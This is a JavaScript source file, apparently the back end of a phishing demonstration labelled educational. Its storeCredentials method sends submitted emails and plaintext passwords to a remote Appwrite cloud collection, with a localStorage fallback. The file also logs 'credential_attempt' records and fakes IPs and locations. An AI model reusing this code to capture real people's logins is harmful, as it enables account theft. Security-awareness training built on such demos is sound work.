// Appwrite Database for educational cybersecurity demonstration
// Uses Appwrite for cloud storage and database management

import { client, databases } from './appwrite';

class AppwriteCybersecurityDatabase {
  constructor() {
    // AppWrite configuration with your project details
    this.appwriteEndpoint = 'https://sgp.cloud.appwrite.io/v1';
    this.projectId = '69b2a05d000ff1fe0013';
    this.databaseId = '69b2a105003247b3a7e6'; // Your database ID
    this.collectionId = 'accounts'; // Your collection ID (accounts collection)
    
    this.useFallback = false;
    
    // Use the configured client from appwrite.js
    this.client = client;
    this.databases = databases;
  }

  initFallback() {
    // Initialize fallback localStorage database
    if (!localStorage.getItem('appwrite_cybersecurity_data')) {
      const initialData = {
        users: [],
        attempts: [],
        timestamp: new Date().toISOString()
      };
      localStorage.setItem('appwrite_cybersecurity_data', JSON.stringify(initialData));
    }
  }

  // Store credentials in AppWrite database
  async storeCredentials(email, password) {
    const userRecord = {
      email: email,
      password: password
    };

    try {
      // Store in AppWrite database
      const response = await this.databases.createDocument(
        this.databaseId,
        this.collectionId,
        'unique()', // Auto-generate ID
        userRecord
      );

      return { ...userRecord, id: response.$id };
    } catch (error) {
      console.error('Failed to store in AppWrite database:', error);
      return this.storeCredentialsFallback(email, password, userRecord);
    }
  }

  // Get statistics from AppWrite database
  async getStatistics() {
    try {
      // Get all documents from the collection
      const response = await this.databases.listDocuments(
        this.databaseId,
        this.collectionId
      );

      const documents = response.documents || [];
      
      // Filter users and attempts
      const users = documents.filter(doc => doc.email && doc.password);
      const attempts = documents.filter(doc => doc.type === 'credential_attempt');

      return {
        totalAttempts: attempts.length,
        totalUsers: users.length,
        recentActivity: attempts.slice(-5).reverse(),
        databaseSize: JSON.stringify(documents).length
      };
    } catch (error) {
      console.error('Failed to get statistics from AppWrite database:', error);
      return this.getStatisticsFallback();
    }
  }

  // Fallback storage methods
  storeCredentialsFallback(email, password, userRecord) {
    const data = this.getLocalDatabase();
    data.users.push(userRecord);
    data.attempts.push({
      type: 'credential_attempt',
      email: email,
      timestamp: userRecord.timestamp,
      success: false
    });
    localStorage.setItem('appwrite_cybersecurity_data', JSON.stringify(data));
    return userRecord;
  }

  getStatisticsFallback() {
    const data = this.getLocalDatabase();
    return {
      totalAttempts: data.attempts.length,
      totalUsers: data.users.length,
      recentActivity: data.attempts.slice(-5).reverse(),
      databaseSize: JSON.stringify(data).length
    };
  }

  getLocalDatabase() {
    const data = localStorage.getItem('appwrite_cybersecurity_data');
    if (!data) {
      const initialData = { users: [], attempts: [] };
      localStorage.setItem('appwrite_cybersecurity_data', JSON.stringify(initialData));
      return initialData;
    }
    return JSON.parse(data);
  }

  // Utility methods
  generateId() {
    return Math.random().toString(36).substr(2, 9);
  }

  getFakeIP() {
    return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }

  getFakeLocation() {
    const cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
    return cities[Math.floor(Math.random() * cities.length)];
  }

  // Clear database
  async clearDatabase() {
    try {
      // Get all documents and delete them
      const response = await this.databases.listDocuments(
        this.databaseId,
        this.collectionId
      );

      const deletePromises = response.documents.map(doc => 
        this.databases.deleteDocument(this.databaseId, this.collectionId, doc.$id)
      );

      await Promise.all(deletePromises);
    } catch (error) {
      console.error('Failed to clear AppWrite database:', error);
      localStorage.removeItem('appwrite_cybersecurity_data');
    }
  }
}

// Export singleton instance
export const appwriteDatabase = new AppwriteCybersecurityDatabase();
